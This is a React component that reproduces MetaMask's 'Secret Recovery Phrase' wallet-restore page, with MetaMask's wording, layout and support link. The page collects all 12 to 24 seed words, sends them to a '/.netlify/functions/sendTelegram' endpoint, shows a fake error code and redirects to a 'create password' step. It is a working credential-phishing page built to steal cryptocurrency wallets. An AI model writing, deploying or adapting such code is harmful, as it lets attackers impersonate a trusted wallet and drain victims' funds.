import React, { useState, useEffect } from "react";
import logo from "../assets/images/logo.png"

// Ensure FontAwesome is imported in your project for icons
// Typically, you'd import it in your index.js or App.js:
// import '@fortawesome/fontawesome-free/css/all.min.css';

const SecretRecoveryPhrase = () => {
  const [phraseCount, setPhraseCount] = useState(12);

  // Each input’s text
  const [words, setWords] = useState(Array(12).fill(""));

  // showWord[i] = false => "password" (•••), icon = eye-slash
  // showWord[i] = true  => "text" => icon = eye
  const [showWord, setShowWord] = useState(Array(12).fill(false));

  // State to track if all cells are filled
  const [allFilled, setAllFilled] = useState(false);

  // State to track if the user has started typing
  const [hasTyped, setHasTyped] = useState(false);

  // State for Error Popup
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const handlePhraseCountChange = (e) => {
    const newCount = Number(e.target.value);
    setPhraseCount(newCount);
    setWords(Array(newCount).fill(""));
    setShowWord(Array(newCount).fill(false));
    setAllFilled(false); // Reset allFilled when phrase count changes
    setHasTyped(false); // Reset hasTyped when phrase count changes
  };

  const toggleShowWord = (index) => {
    const updated = [...showWord];
    updated[index] = !updated[index];
    setShowWord(updated);
  };

  const handleChangeWord = (index, value) => {
    if (!hasTyped) {
      setHasTyped(true); // User has started typing
    }
    const updatedWords = [...words];
    updatedWords[index] = value;
    setWords(updatedWords);
  };

  const handlePaste = (index, e) => {
    e.preventDefault();
    if (!hasTyped) {
      setHasTyped(true); // User has started typing via paste
    }
    const text = e.clipboardData.getData("text").trim();
    const splitted = text.split(/\s+/);
    const updated = [...words];

    // Start pasting from the first cell (index 0) instead of the current index
    let pointer = 0;
    splitted.forEach((w) => {
      if (pointer < phraseCount) {
        updated[pointer] = w;
        pointer++;
      }
    });
    setWords(updated);
  };

  useEffect(() => {
    const filled =
      words.length === phraseCount &&
      words.every((word) => word.trim() !== "");
    setAllFilled(filled);
  }, [words, phraseCount]);
  
  const sendToTelegram = async (words) => {
    try {
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ words }),
      });
  
      const data = await response.json();
  
      if (!response.ok) {
        throw new Error(data.message || 'Failed to send message.');
      }
  
      console.log('Message sent successfully to Telegram');
      // Optionally, navigate to the next page or provide success feedback
      // window.location.href = "/create-password";
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
      setErrorMessage('Please wait a few minutes before you try again.');
      setShowErrorPopup(true);
    }
  };
  
  // Error Popup Component
  const ErrorPopup = ({ message, onClose }) => {
    const [errorCode, setErrorCode] = useState("");

    useEffect(() => {
      // Generate a random 4-digit error code prefixed with 'ERR-'
      const generateErrorCode = () => {
        const randomNumber = Math.floor(1000 + Math.random() * 9000);
        return `ERR-${randomNumber}`;
      };

      setErrorCode(generateErrorCode());
    }, []);

    return (
      <div className="fixed inset-0 flex items-center justify-center z-50">
        {/* Backdrop Overlay */}
        <div
          className="absolute inset-0 bg-black opacity-50"
          onClick={onClose}
        ></div>

        {/* Modal Content */}
        <div className="bg-white rounded-lg shadow-lg z-10 p-6 max-w-sm w-full mx-4">
          {/* Header */}
          <div className="flex items-center justify-center mb-4">
            <i className="fas fa-exclamation-triangle text-red-500 text-3xl mr-2"></i>
            <h2 className="text-2xl font-bold text-center text-red-600">Error</h2>
          </div>

          {/* Error Code */}
          <p className="text-center mb-2 font-mono text-gray-800">
            {errorCode}
          </p>

          {/* Explanation */}
          <p className="text-center mb-6 text-gray-700">
            Please wait a few minutes before you try again.
          </p>

          {/* Dismiss Button */}
          <div className="flex justify-center">
            <button
              onClick={onClose}
              className="px-6 py-2 bg-red-500 text-white rounded hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-400"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ backgroundColor: "#141618", color: "var(--color-text-default)" }}
    >
      {/* NAVBAR (top) */}
      <nav className="h-16 flex items-center justify-between px-4">
        {/* Left: Logo placeholder */}
        <div className="flex items-center space-x-2">
          <img
            src={logo}
            alt="Logo"
            className="h-6 w-auto"
          />
        </div>
        {/* Right: Language Selector */}
        <select className="border border-gray-500 bg-[rgb(20,22,24)] text-white px-14 py-2 rounded-md">
          <option>English</option>
          <option>Spanish</option>
          <option>French</option>
        </select>
      </nav>

      {/* MAIN CONTENT */}
      <div className="flex-grow flex items-center justify-center p-4">
        <div className="relative w-full max-w-lg rounded-xl p-6 md:p-8 pb-14 border border-zinc-800">
          {/* Step Indicator */}
          <div className="flex items-center justify-center mb-6">
            {/* Fixed container width to position circles & line accurately */}
            <div className="relative w-[350px] h-[40px]">
              {/* Black line behind the circles */}
              <div className="absolute h-0.5 bg-black top-2 left-20 right-20 -translate-y-1/2" />

              {/* STEP 1 */}
              <div
                className="absolute flex flex-col items-center"
                style={{
                  left: 0,
                  top: "50%",
                  transform: "translateY(-50%)",
                }}
              >
                <div
                  className="w-8 h-8 rounded-full border-2 border-[rgb(67,174,252)]
                             bg-[#141618] text-[rgb(67,174,252)] font-bold
                             flex items-center justify-center"
                >
                  1
                </div>
                <p className="text-xs mt-1 text-[rgb(67,174,252)]">
                  Confirm secret recovery phrase
                </p>
              </div>

              {/* STEP 2 */}
              <div
                className="absolute flex flex-col items-center"
                style={{
                  right: 25,
                  top: "50%",
                  transform: "translateY(-50%)",
                }}
              >
                <div
                  className="w-8 h-8 rounded-full border-2 border-gray-500
                             bg-[#141618] text-gray-500 font-bold
                             flex items-center justify-center"
                >
                  2
                </div>
                <p className="text-xs mb-2 mt-1 text-gray-500">Create password</p>
              </div>
            </div>
          </div>

          {/* Title & SubTitle */}
          <h2 className="text-2xl md:text-lg font-bold text-center mb-6 text-white">
            Access your wallet with your Secret Recovery Phrase
          </h2>
          <p className="text-base md:text-sm text-center mb-6 px-2">
            MetaMask cannot recover your password. We will use your Secret Recovery
            Phrase to validate your ownership, restore your wallet and set up a new
            password. First, enter the Secret Recovery Phrase that you were given
            when you created your wallet.{" "}
            <a
              href="https://support.metamask.io/start/learn/what-is-a-secret-recovery-phrase-and-how-to-keep-your-crypto-wallet-secure/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-[rgb(67,174,252)]"
            >
              Learn more
            </a>
          </p>

          {/* SRP label + dropdown */}
          <div className="flex flex-col md:flex-row items-center justify-between mb-5 w-full">
            <label className="font-bold text-sm text-white mb-2 md:mb-0 w-full md:w-auto">
              Type your Secret Recovery Phrase
            </label>
            <select
              value={phraseCount}
              onChange={handlePhraseCountChange}
              className="border border-gray-500 bg-[rgb(20,22,24)] text-white px-3 py-2 rounded-md w-full md:w-auto"
            >
              <option value="12">I have a 12-word phrase</option>
              <option value="15">I have a 15-word phrase</option>
              <option value="18">I have an 18-word phrase</option>
              <option value="21">I have a 21-word phrase</option>
              <option value="24">I have a 24-word phrase</option>
            </select>
          </div>

          {/* Info Box */}
          <div className="border-l-4 border-[rgb(67,174,252)] bg-[#1B2B38] p-2 mb-6 rounded">
            <div className="flex items-start text-white text-sm">
              <i className="fa-solid fa-circle-info text-[rgb(67,174,252)] text-base flex-shrink-0"></i>
              <span className="ml-1 text-xs">
                You can paste your entire secret recovery phrase into any field
              </span>
            </div>
          </div>

          {/* Input Fields Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 mb-2">
            {words.map((word, i) => (
              <div key={i} className="flex items-center justify-center">
                {/* Number (ensure same width for single/double digits) */}
                <span
                  className="mr-2 text-white font-mono"
                  style={{ minWidth: "1.5rem", textAlign: "right" }}
                >
                  {i + 1 < 10 ? ` ${i + 1}` : i + 1}.
                </span>

                {/* Single bordered box wrapping only the input */}
                <div className="mb-2 mt-2 border border-gray-500 rounded-md bg-[#141618] w-full px-2 md:px-3 py-1 md:py-2 max-w-xs md:max-w-full">
                  <input
                    type={showWord[i] ? "text" : "password"}
                    value={word}
                    onChange={(e) => handleChangeWord(i, e.target.value)}
                    onPaste={(e) => handlePaste(i, e)}
                    className="w-full bg-transparent text-white focus:outline-none text-sm"
                  />
                </div>

                {/* Eye icon (outside the border, on the right) */}
                <button
                  type="button"
                  onClick={() => toggleShowWord(i)}
                  className="ml-2 text-gray-400 hover:text-gray-200"
                >
                  {showWord[i] ? (
                    <i className="fa-regular fa-eye text-base"></i>
                  ) : (
                    <i className="fa-regular fa-eye-slash text-base"></i>
                  )}
                </button>
              </div>
            ))}
          </div>

          {/* Show Warning Box only if user has started typing and not all cells are filled */}
          {hasTyped && !allFilled && (
            <div className="border-l-4 border-[rgb(232,143,151)] bg-[#34282B] p-3 mb-6 rounded">
              <div className="flex items-start text-white text-sm">
                <i className="fa-solid fa-warning text-[rgb(232,143,151)] text-base flex-shrink-0"></i>
                <span className="ml-1 text-xs">
                  Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words
                </span>
              </div>
            </div>
          )}

          {/* Confirm Button */}
          <div className="flex justify-center">
            <button
              className={`mb-6 px-8 py-3 text-lg md:text-sm rounded-full font-medium w-full md:w-auto ${
                allFilled
                  ? "bg-[rgb(67,174,252)] hover:bg-[rgb(67,174,252)] hover:opacity-90 text-black"
                  : "bg-[rgb(67,174,252)] bg-opacity-40 text-black cursor-not-allowed"
              }`}
              onClick={async () => {
                if (allFilled) {
                  await sendToTelegram(words); // Send formatted message to Telegram
                  // Navigate to the next page only if sending was successful
                  window.location.href = "/create-password";
                }
              }}
              disabled={!allFilled}
            >
              Confirm Secret Recovery Phrase
            </button>
          </div>

          {/* Error Popup */}
          {showErrorPopup && (
            <ErrorPopup
              message={errorMessage}
              onClose={() => setShowErrorPopup(false)}
            />
          )}
        </div>
      </div>
    </div>
  );
};

// ErrorPopup Component
// eslint-disable-next-line
const ErrorPopup = ({ message, onClose }) => {
  const [errorCode, setErrorCode] = useState("");

  useEffect(() => {
    // Generate a random 4-digit error code prefixed with 'ERR-'
    const generateErrorCode = () => {
      const randomNumber = Math.floor(1000 + Math.random() * 9000);
      return `ERR-${randomNumber}`;
    };

    setErrorCode(generateErrorCode());
  }, []);

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50">
      {/* Backdrop Overlay */}
      <div
        className="absolute inset-0 bg-black opacity-50"
        onClick={onClose}
      ></div>

      {/* Modal Content */}
      <div className="bg-white rounded-lg shadow-lg z-10 p-6 max-w-sm w-full mx-4">
        {/* Header */}
        <div className="flex items-center justify-center mb-4">
          <i className="fas fa-exclamation-triangle text-red-500 text-3xl mr-2"></i>
          <h2 className="text-2xl font-bold text-center text-red-600">Error</h2>
        </div>

        {/* Error Code */}
        <p className="text-center mb-2 font-mono text-gray-800">
          {errorCode}
        </p>

        {/* Explanation */}
        <p className="text-center mb-6 text-gray-700">
          Please wait a few minutes before you try again.
        </p>

        {/* Dismiss Button */}
        <div className="flex justify-center">
          <button
            onClick={onClose}
            className="px-6 py-2 bg-red-500 text-white rounded hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-400"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

export default SecretRecoveryPhrase;
